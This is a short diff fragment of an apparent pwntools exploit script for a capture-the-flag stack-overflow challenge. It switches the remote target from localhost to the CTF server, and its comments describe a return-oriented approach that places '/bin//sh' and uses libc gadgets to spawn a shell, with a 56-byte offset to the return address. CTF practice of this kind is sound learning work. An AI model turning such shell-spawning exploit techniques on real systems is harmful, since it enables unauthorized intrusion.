@@ -16,8 +16,8 @@ context.arch = 'amd64'
 #solution 2 : set '/bin//sh\0' to variable t,set regiter by gadget in ./migr4ti0n
 
 #about solution 2,i can't find such gadget fit that condition to set ax,so i use lib.so.6 to practice both.
-r = remote('127.0.0.1',8888)
-#r = remote('csie.ctf.tw',10130)
+#r = remote('127.0.0.1',8888)
+r = remote('csie.ctf.tw',10132)
 
 r.recvuntil(':')
 #the offset from buf to ret is 56,the rbp is 48
